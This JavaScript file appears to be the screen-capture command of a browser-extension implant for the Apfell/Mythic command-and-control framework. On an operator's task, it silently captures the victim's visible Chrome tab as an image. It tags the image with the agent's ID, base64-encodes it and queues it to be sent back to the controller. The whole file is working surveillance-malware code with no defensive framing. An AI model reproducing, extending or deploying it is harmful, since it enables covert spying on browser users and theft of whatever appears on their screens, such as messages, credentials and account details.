exports.screencapture = function(task){
    try {
        let param = {
            'format': 'png',
            'quality': 75
        };
        chrome.tabs.captureVisibleTab(param, function(img) {
            if (img === undefined) {
                let response = {'task_id':task.id, 'user_output': 'screencapture failed', 'completed': false, 'status':'error'};
                let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
                let enc = JSON.stringify(outer_response);
                let final = apfell.apfellid + enc;
                let msg = btoa(unescape(encodeURIComponent(final)));
                out.push(msg);
            } else {
                let encImg = img.toString().split(',')[1];
                let raw = encImg;
                let totalchunks = 1;
                let response = {'total_chunks':totalchunks, 'task_id':task.id, 'full_path':task.parameters};
                let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
                let enc = JSON.stringify(outer_response);
                let final = apfell.apfellid + enc;
                let msg = btoa(unescape(encodeURIComponent(final)));
                out.push(msg);
                screencaptures.push({'type':'screencapture','task_id':task.id, 'image':raw, 'total_chunks': totalchunks});
            }
        });
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
    
};